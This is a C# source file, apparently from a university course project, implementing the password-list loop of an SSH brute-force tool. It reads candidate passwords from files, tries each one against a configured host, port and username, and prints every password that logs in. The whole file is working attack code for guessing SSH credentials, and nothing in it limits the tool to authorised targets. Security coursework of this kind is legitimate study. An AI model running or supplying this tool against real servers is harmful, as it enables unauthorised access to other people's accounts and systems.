using _CS5573_BruteForce.Input;
using _CS5573_BruteForce.Ssh;
using System;
using System.Collections.Generic;
using System.IO;

namespace _CS5573_BruteForce.PasswordReader
{
    public class FileReader
    {
        private FileFinder _fileFinder;
        private SSHConnection _sshConn;
        private string _host, _username, _password;
        private int _port;
        public bool broken = false;

        public FileReader()
        {
            _sshConn = new SSHConnection();
            _fileFinder = new FileFinder();
            _fileFinder.ListFiles();
        }
        
        public void StreamTxt(string filePath)
        {
            using (Stream fileStream = File.OpenRead(filePath))
            {
                using (StreamReader reader = new StreamReader(fileStream))
                {
                    while (!reader.EndOfStream)
                    {
                        var password = reader.ReadLine();
                        Console.WriteLine(String.Format("Trying Username: {0}, Password: {1}, on {2}, {3}.", _username, password, _host, _port));
                        var valid = _sshConn.Connect(_host, _port, _username, password);
                        if (valid)
                        {
                            Console.WriteLine(String.Format("The password '{0}' is valid for User '{1}'.", password, _username));

                            if (!PromptUserToContinue())
                            {
                                broken = true;
                                break;
                            }
                        }
                    }

                }
            }
        }

        public bool TryConnection()
        {
            return _sshConn.Connect(_host, _port, _username, _password);
        }

        public List<String> GetPasswordLists()
        {
            return _fileFinder.inputFiles;
        }

        private bool PromptUserToContinue()
        {
            Console.Write("Would you like to continue trying other passwords? (y/n): ");
            var input = Console.In.ReadLine();
            if (input.ToLower().Contains("y"))
            {
                return true;
            }
            return false;
        }

        public void SetSSH(string host, int port, string username, string password)
        {
            _host = host;
            _username = username;
            _password = password;
            _port = port;
        }
    }
}
